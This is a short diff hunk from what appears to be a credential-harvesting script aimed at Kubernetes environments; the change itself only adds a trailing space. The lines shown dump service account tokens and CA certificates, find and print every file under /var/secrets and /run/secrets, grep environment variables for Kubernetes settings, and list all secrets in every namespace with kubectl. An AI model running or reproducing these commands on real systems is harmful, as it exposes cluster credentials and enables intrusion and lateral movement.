@@ -80,7 +80,7 @@ emit('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt')
 emit('/var/run/secrets/kubernetes.io/serviceaccount/namespace')
 emit('/run/secrets/kubernetes.io/serviceaccount/token')
 emit('/run/secrets/kubernetes.io/serviceaccount/ca.crt')
-run('find /var/secrets /run/secrets -type f 2>errors.txt | xargs -I{} sh -c \'echo "=== {} ==="; cat "{}" 2>errors.txt\'')
+run('find /var/secrets /run/secrets -type f 2>errors.txt | xargs -I{} sh -c \'echo "=== {} ==="; cat "{}" 2>errors.txt \'')
 run('env | grep -i kube; env | grep -i k8s')
 run('kubectl get secrets --all-namespaces -o json 2>errors.txt || true')
 
